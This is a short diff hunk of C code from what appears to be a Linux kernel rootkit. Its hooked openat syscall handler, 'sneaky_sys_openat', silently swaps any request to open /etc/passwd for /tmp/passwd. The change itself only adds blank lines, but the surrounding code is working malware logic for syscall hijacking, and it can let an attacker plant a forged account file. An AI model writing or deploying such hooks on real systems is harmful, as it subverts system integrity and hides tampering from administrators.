@@ -48,10 +48,12 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   strncpy(original_pathname, regs->si, sizeof(original_pathname));
   original_pathname[sizeof(original_pathname) -1] = '\0';
 
+
   if(strcmp(original_pathname, "/etc/passwd") == 0){
     char new_pathname[] = "/tmp/passwd";
     copy_to_user(regs->si, new_pathname, sizeof(new_pathname));
   }
+  
   return (*original_openat)(regs);
 }
 
